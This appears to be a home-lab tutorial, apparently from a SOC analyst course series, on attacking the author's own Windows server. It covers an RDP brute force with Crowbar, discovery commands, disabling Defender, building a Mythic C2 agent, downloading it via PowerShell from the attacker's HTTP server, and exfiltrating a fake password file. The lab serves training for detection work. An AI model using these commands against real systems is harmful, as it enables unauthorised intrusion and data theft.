# Day 21: Performing a Brute Force Attack and Establishing a C2 Session

## 1. Introduction

**Goal**: Learn how to perform a Brute Force attack, generate a Mythic agent, and establish a successful C2 session from a Windows server.
## 2. Objective

**Steps**:

- Use Kali Linux to perform a Brute Force attack on a Windows server.
- Perform discovery commands and defense evasion.
- Execute phase four using Mythic C2 to generate a payload with a C2 profile.
- Use PowerShell to download the Mythic agent from the Mythic C2 server.
- Establish a C2 connection and download a password file from the Windows server.

## 3. Preparing the Windows Server

**Steps**:

1. Create a fake file named `passwords.txt` in the Documents folder.
2. Change the password to `Winter2024!`:
    - Go to Start Menu > Username > Change Account Settings > Sign-in Options > Password > Change.
    - Enter current password, then set new password to `Winter2024!`.
    - If password policy requirements are not met, adjust settings in Local Group Policy Editor:
        - Minimum password length: 5 characters.
        - Disable complexity requirements.

## 4. Performing RDP Brute Force Attack

**Steps**:

1. **Log in to Kali Linux machine.**
2. **Use pre-existing word list from Kali Linux:**

Navigate to `/usr/share/wordlists`.
Unzip `rockyou.txt` using `gunzip`.

```
sudo gunzip rockyou.txt.gz
```

Extract first 50 entries and add `Winter2024!` to the list.

```
cat rockyou.txt >>
```

1. **Install and use Crowbar for Brute Force attack:**

Update and upgrade repositories: 

```
sudo apt-get update && sudo apt-get upgrade
```

			 
Install Crowbar: 

```
sudo apt-get install crowbar
```

Create target file with Windows server IP and username.

## 5. Continuing the Brute Force Attack

**Steps**:

1. **Perform Brute Force Attack**:
    
    - Use Crowbar to authenticate with the target IP address using CIDR notation.
    - Command: `crowbar -b rdp -u administrator -C /path/to/wordlist -s <target_ip> -n 32`
    - Successful RDP login with username `administrator` and password `Winter2024!`.
2. **Connect via RDP**:
    
    - Use `xfreerdp` to connect to the Windows server.
    - Command: `xfreerdp /u:administrator /p:Winter2024! /v:<target_ip>:3389`
    - Trust the certificate and establish RDP connection.

## 6. Discovery Commands

**Commands**:

1. **Who Am I**: `whoami`
2. **IP Configuration**: `ipconfig`
3. **Net User**: `net user`
4. **Net Group**: `net group`
5. **Net User (Specific User)**: `net user <username>`

## 7. Defense Evasion

**Steps**:

1. **Disable Windows Defender**:
    - Open Windows Security settings.
    - Disable Real-time protection and other security features.

## 8. Execution Phase

**Steps**:

1. **Build Mythic Agent**:
    
    - Access Mythic web GUI and SSH session.
    - Install Apollo agent:
        - Command: `mythic-cli install github https://github.com/MythicAgents/Apollo`
    - Install HTTP C2 profile:
        - Command: `mythic-cli install github https://github.com/MythicC2Profiles/http`
2. **Create Payload**:
    
    - Generate new payload in Mythic web GUI.
    - Select target machine (Windows) and output format (Windows executable).
    - Include all available commands and set callback host to Mythic server IP.
    - Set callback interval and port.
    - Name the payload with your username and description.

## 9. Downloading and Executing the Payload

**Steps**:

1. **Download Payload**:
    
    - Copy the download link address from Mythic web GUI.
    - Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
    - Rename the downloaded file to `servicehost-stevenrocks.exe`.
2. **Serve Payload via HTTP**:
    
    - Create a directory and move the payload into it.
    - Use Python's HTTP server module to serve the payload on port 9999.
    - Command: `python3 -m http.server 9999`.
3. **Download Payload on Windows Server**:
    
    - Use PowerShell to download the payload from the Mythic server.
    - Command: `Invoke-WebRequest -Uri http://<Mythic_IP>:9999/servicehost-stevenrocks.exe -OutFile C:\Users\Public\Downloads\servicehost-stevenrocks.exe`.
4. **Execute Payload**:
    
    - Run the downloaded payload on the Windows server.
    - Verify the connection using `netstat` and Task Manager.

## 10. Establishing C2 Connection

**Steps**:

1. **Allow Necessary Ports**:
    
    - Ensure UFW firewall allows ports 9999 and 80.
2. **Verify Connection**:
    
    - Check for established connection using `netstat`.
    - Confirm process ID in Task Manager.
3. **Interact with Active Callback**:
    
    - Use Mythic web GUI to interact with the active callback.
    - Run commands like `whoami` and `ipconfig` to verify the connection.

## 11. Exfiltration

**Steps**:

1. **Download Fake Password File**:
    
    - Use Mythic's download command to retrieve the `passwords.txt` file.
    - Command: `download C:\Users\Administrator\Documents\passwords.txt`.
2. **Verify Download**:
    
    - Check the downloaded file in Mythic web GUI.
    - Confirm the contents of the file.

## 12. Conclusion

**Summary**:

- Successfully performed a Brute Force attack and established a C2 session.
- Downloaded and executed a payload on the Windows server.
- Retrieved a fake password file using the established C2 connection.

**Next Steps**:

- Create alerts and dashboards to detect Mythic activity.
- Participate in the giveaway for a chance to win a free Vulture for the MyDFIR SH Analyst course and TryHackMe passes.